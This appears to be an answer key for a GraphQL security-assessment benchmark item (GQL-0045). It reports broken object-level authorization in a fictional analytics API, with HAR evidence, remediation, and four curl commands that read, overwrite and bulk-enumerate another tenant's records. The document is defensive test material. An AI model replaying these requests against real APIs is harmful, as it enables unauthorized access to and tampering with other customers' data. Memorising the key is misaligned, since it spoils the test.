# Expected Response

## System
- Domain: Data Analytics / BI Platform
- System: InsightGraph Analytics API
- Example ID: GQL-0045

## Priority Findings

### Finding 1: BOLA — ID Without Ownership Check + Cross-Tenant Write via updateResource (Pattern 1.1)
**Severity:** Critical
**Category:** BOLA

**Summary:**
The `updateResource` mutation on `POST /graphql` accepts `id: "R-2045"` (a BI analytics record belonging to `tenant-d637`) from an attacker authenticated as `tenant-e491`, without verifying that the record belongs to the caller's tenant. Per §5.0 (Pattern 1.1): "An attacker with a valid `tenant-e491` token can substitute any `resourceId` value to retrieve objects belonging to `tenant-d637`." Beyond read access, the write mutation confirms no ownership check exists at the resolver level. The attacker injected `status: "approved"` and `ownerId: "attacker-e491d637"`, successfully writing to a cross-tenant analytics record and hijacking its ownership.

**Evidence from HAR:**
- Request: `POST https://api.insightgraph-analyti.example.com/graphql` (2026-04-13T16:22:34Z, 260 ms, wait: 65 ms)
- JWT `x-tenant-id`: `tenant-e491` — attacker's identity (matches §5.0)
- Mutation payload: `updateResource(id: "R-2045", input: {status: "approved", ownerId: "attacker-e491d637"})` — victim ID substituted, ownership injected
- Response HTTP status: `200 OK` — write succeeded
- Response `tenantId`: `tenant-d637` — confirms target tenant (matches §5.0)
- Response `ownerId`: `other-user-e491d637`
- Response `sensitiveField`: `CONFIDENTIAL-e491d637` — BI analytics data leaked
- Response `internalNotes`: `Internal data exposed`
- `x-request-id`: `req-e491d637`

**Root Cause (§4.0 RISK-GQL-045 + §5.0):** "The `getResource` resolver accepts `resourceId` from the query without verifying ownership." The same missing check applies to `updateResource`. Per §4.0: "The resolver does NOT verify that the fetched object's `tenantId` matches the JWT's `tenantId`."

**Evidence Map:**
| Artifact | Location | Detail |
|---|---|---|
| context.txt §4.0 | RISK-GQL-045 | "resolver does NOT verify tenantId against JWT's tenantId" |
| context.txt §5.0 | Pattern 1.1 | "attacker with tenant-e491 token can substitute resourceId to retrieve tenant-d637 objects" |
| HAR entry | request.postData | `updateResource(id: "R-2045", input: {status: "approved", ownerId: "attacker-e491d637"})` |
| HAR entry | response.content | `tenantId: "tenant-d637"`, `sensitiveField: "CONFIDENTIAL-e491d637"` — cross-tenant write confirmed |

---

### Finding 2: Cross-Tenant Bulk Analytics Data Enumeration via bulkResourceLookup (Pattern 1.9)
**Severity:** High
**Category:** BOLA / Mass Enumeration

**Root Cause (§4.0):** "The `bulkResourceLookup` mutation accepts an arbitrary array of IDs without per-ID ownership filtering." In a BI/analytics platform, bulk enumeration exposes business intelligence reports and analytics datasets across tenants.

---

## Steps to Reproduce

### Step 1 — Confirm attacker baseline (own analytics records)
```bash
curl -s -X POST https://api.insightgraph-analyti.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-e491" \
  -d '{"query": "query { getResource(id: \"R-e491-001\") { resourceId tenantId ownerId data { sensitiveField } } }"}'
```
**Expected:** Returns `tenantId: "tenant-e491"` analytics record.

### Step 2 — Read cross-tenant analytics record via getResource
```bash
curl -s -X POST https://api.insightgraph-analyti.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-e491" \
  -d '{"query": "query { getResource(id: \"R-2045\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable outcome:** Returns `tenantId: "tenant-d637"`, `sensitiveField: "CONFIDENTIAL-e491d637"` — read BOLA confirmed.
**Secure outcome:** HTTP 403 or `{"errors": [{"message": "Forbidden"}], "data": {"getResource": null}}`.

### Step 3 — Write + ownerId injection (HAR attack)
```bash
curl -s -X POST https://api.insightgraph-analyti.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-e491" \
  -d '{"query": "mutation { updateResource(id: \"R-2045\", input: {status: \"approved\", ownerId: \"attacker-e491d637\"}) { resourceId status tenantId } }"}'
```
**Vulnerable outcome:** `200 OK`, `R-2045` (belonging to `tenant-d637`) updated to `status: "approved"`, `ownerId` hijacked to `attacker-e491d637`.
**Secure outcome:** HTTP 403 or `{"errors": [{"message": "Forbidden"}], "data": {"updateResource": null}}`.

### Step 4 — Bulk cross-tenant analytics enumeration
```bash
curl -s -X POST https://api.insightgraph-analyti.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-e491" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2045\", \"R-d637-002\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns analytics records from `tenant-d637`.
**Secure outcome:** Only own-tenant records; cross-tenant IDs yield null or FORBIDDEN.

## Secure Outcome Verification
For **Step 3**, a correctly patched implementation MUST return:
```json
{
  "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }],
  "data": { "updateResource": null }
}
```

## Remediation
1. **Resolver-level ownership check on getResource and updateResource:** Apply `WHERE resource_id = $id AND tenant_id = $jwt.tenantId` for every resource fetch and write (§4.0 RISK-GQL-045, §5.0).
2. **Strip ownerId from ResourceInput:** `ownerId` must NOT be a client-supplied field — derive from JWT's `sub`.
3. **Per-ID ownership filter in bulkResourceLookup:** Post-fetch, reject any result whose `tenant_id` ≠ JWT's `tenantId`.
4. **Redis cache key includes tenantId:** §2.0 caches by `resourceId` only — change to `resourceId:tenantId`.
5. **Automated regression tests:** Assert `tenant-e491` accessing `R-2045` via `getResource` or `updateResource` returns FORBIDDEN.
